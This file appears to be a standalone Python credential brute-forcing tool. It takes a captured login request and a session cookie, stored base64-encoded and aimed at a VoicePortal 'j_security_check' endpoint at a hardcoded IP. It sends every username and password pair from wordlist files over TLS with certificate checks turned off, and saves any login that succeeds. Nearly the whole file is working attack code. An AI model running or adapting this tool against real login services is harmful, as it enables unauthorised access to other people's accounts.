# Author: Diego Tomsig                                                                   #
#   File: httpBruteForce.py                                                              #
#   Date: 7/28/2015                                                                      #
#   Desc: Simple brute force tool using sockets. The baseRequest is the value of an      #
#   HTTP request taken from Fiddler (or other packet sniffing programs). The additional  #
#   post request is appended to the base request and run through the program. Use fiddler#
#   to generate the HTTP post requests necessary to make the brute force function.       #
##########################################################################################

import socket
import base64
import ssl
import time
import sys

HOST = "127.0.0.1"                                            #Host or User IP address
PORT = 443                                                    #Port 
USERNAME_FIELD = "j_username"                                 #Name of the parameter for 
PASSWORD_FIELD = "j_password"                                 #Name of the parameter     for pass
FOUND = False                                                 #Default found variable
PASSWORD_FILE = open('password.txt', 'r').read().split('\n')  #Set Password File                                                     
USERNAME_FILE = open('username.txt', 'r').read().split('\n')  #Set Username File
WORKING_LOGINS = open('working.txt', 'w')                     #Output File where good credentials are stored
FAILED_TEXT = "Sorry, that Username and Password did"         #Unique test when a failed log in shows up
baseRequest = "UE9TVCBodHRwczovLzE2NS4yMzcuMjcuNDMvVm9pY2VQb3J0YWwval9zZWN1cml0eV9jaGVjayBIVFRQLzEuMQ0KSG9zdDogMTY1LjIzNy4yNy40Mw0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KQ29udGVudC1MZW5ndGg6IDU5DQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCk9yaWdpbjogaHR0cHM6Ly8xNjUuMjM3LjI3LjQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjcyLjEwMSBTYWZhcmkvNTM3LjM2DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KUmVmZXJlcjogaHR0cHM6Ly8xNjUuMjM3LjI3LjQzL1ZvaWNlUG9ydGFsLw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC44DQpDb29raWU6IEpTRVNTSU9OSUQ9RjQ0QTM0MzI2MjAyQjdEMEM4RTM2QjYyQzJCN0Q2RDcNCg0K"
   
   
#Loop through the password/username file and append to the base request
for user in USERNAME_FILE:
	
    for passw in PASSWORD_FILE:
        appendRequest = "j_username=" + user + "&j_organization=&j_password=" + passw + "&logon=Logon"
        appendRequest = base64.b64encode(appendRequest.encode('utf-8'))
        appendRequest = appendRequest.decode('utf-8')
        completeRequest = baseRequest + appendRequest
       
        decodedComplete = base64.b64decode(completeRequest) 
		
		#Recreate/connect the socket, this creates an SSL connection to the host. The previous reference gets destroyed.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_socket = ssl.wrap_socket(s, certfile = None, server_side = False, cert_reqs=ssl.CERT_NONE, ssl_version = ssl.PROTOCOL_TLSv1_2, ca_certs = None, do_handshake_on_connect = True, suppress_ragged_eofs = True, ciphers = None)
        ssl_socket.connect((HOST, 443))   
        ssl_socket.send(decodedComplete)
        time.sleep(.5)
		
        #Add the entire request together coming from the server. More receive commands need to be 
        ssl_socket.recv(100)
        data = (ssl_socket.recv(100))
        data += (ssl_socket.recv(100))
        data += (ssl_socket.recv(8174))	
        data = data.decode('utf-8')
        print("\n\n\n")
		
		
        #Check to see if the unique text is in the request from the server.
        if(FAILED_TEXT in data):
            print("Status: FAILED")
            print("Username: " + user)
            print("Password: " + passw)
            print("\n")

        else:
            print("Status: SUCCESS\n")
            print("Username: " + user)
            print("Password: " + passw)
            print("Now saving information to text file.")
            WORKING_LOGINS.write("  Status: SUCCESS\n")
            WORKING_LOGINS.write("Username: " + user + "\n")
            WORKING_LOGINS.write("Password: " + passw + "\n\n")
            sys.exit()
        
        
        #Reset the values for the next loop
        completeRequest = ""
        appendRequest = ""
        ssl_socket.close()
